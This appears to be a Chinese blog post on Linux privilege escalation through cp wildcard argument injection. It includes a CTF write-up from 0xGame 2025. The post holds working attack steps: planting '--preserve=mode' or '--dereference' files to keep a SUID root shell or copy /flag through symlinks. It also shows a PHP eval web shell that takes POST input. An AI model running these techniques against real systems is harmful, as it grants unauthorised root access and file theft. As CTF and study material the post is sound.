---
title: Linux 提权
date: 2026-08-30 14:20:00
categories:
  - 渗透测试
tags:
  - 提权
  - Linux
description: Linux 提权
---

[Linux提权技巧：cp、sudo、find与环境变量利用-CSDN博客](https://blog.csdn.net/dqd66/article/details/127389839)

[Linux提权详解 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/436960.html)

[数据库---提权思路 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/282401.html)

GNU cp / coreutils 中（常见 Linux 都是它）：

- `-P` / `--no-dereference`：**不跟随软链接**，复制链接本体。
-  `-H`：只跟随 **命令行参数里的软链接**，复制目标内容。
- `-L` / `--dereference`：跟随所有软链接，复制目标内容。
- `-p` / `--preserve[=mode|ownership|timestamps…]`：默认会保留 `mode`（权限位）等属性。
- `-a` / `--archive`：等价于 `-dR --preserve=all`（保留所有属性）。

> 通配符提权最常用的就是：
>  **注入 `--preserve=mode` / `-p` 保留 SUID**，
>  或者注入 `-L/--dereference` 跟随软链读敏感文件。

## 1.SUID

```sh
# 1) 放一个你自己的可执行文件
gcc rootshell.c -o rootshell
chmod 4755 rootshell               # 关键：源文件带 SUID

# 2) 注入选项文件
touch -- "--preserve=mode"

# 3) 等 root 的 cp * 执行完
/priv/dir/rootshell -p
```

​       效果：`cp --preserve=mode rootshell /priv/dir/`,SUID 被保留，且属主变成 root，于是提权。

## 2.软连接

脚本中：

```sh
cp -P * /var/www/html/marstream/
```

`-P` 本来禁止跟随软链。
 但你可以用通配符注入 **覆盖这个行为**：

目录里放：

```sh
> "--dereference"   # 等价 -L
ln -s /flag ff
```

root 实际执行类似：

```sh
cp -P --dereference ff /var/www/html/marstream/
```

**最后出现的 dereference 模式生效**（GNU cp），于是 `ff` 被复制成**普通文件**，内容是 `/flag`，你就能在 marstream 里 `cat ff`。

## 3.配合后续 chmod/chown 的 glob（symlink 跟随）

很多脚本是：

```sh
cp * /dst/
chmod -R 755 /dst/
```

即使 cp 不跟随软链，**chmod -R 默认会跟随**（对 symlink 指向目标生效）。
 所以你只要让 `/dst/xx` 变成 `xx -> /flag`，下一轮 chmod 就会把 `/flag` 权限改大，间接读到。

# 习题：

## [0xGame_2025_week3]放开我的变量（cp通配符提权）

扫目录发现/asdback.php

```php
<?php
 
highlight_file(__FILE__);
echo("Please Input Your CMD");
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
?> 
```

连蚁剑

没有权限

start.sh：

![image-20251208145232159](/img/ctf/linux-privesc-001.png)

`cd /var/www/html/primary`进入 `primary` 目录。

`while : ... done &`无限循环放到后台跑（`&`）。

`cp -P * /var/www/html/marstream/`:

每 5 秒把 ***\*primary 目录下所有非隐藏文件\****（`*` 不含点文件）复制到 `marstream`。

`-P` = ***\*不跟随软链接\****，遇到 symlink 会把 symlink 本身复制过去，而不是复制目标文件内容。

`chmod 755 -R /var/www/html/marstream/`:

递归把 `marstream` 下的所有文件/目录权限改成 755。

cp通配符提权

![image-20251208145236933](/img/ctf/linux-privesc-002.png)

```sh
cd /var/www/html/primary

echo "">"-H"   # 造一个文件名为 -H 的空文件，-H可以跟随命令符号链接
,意味这我们可以获取真实的文件内容而不仅仅是软链接,我们可以创建一个名为-H的文件实现参数的注入

ln -s /flag ff   创建软链接指向/flag,这个时候cp命令会将真实的flag做备份并且实现可读权限的赋予
cd ../marstream
cat ff
```



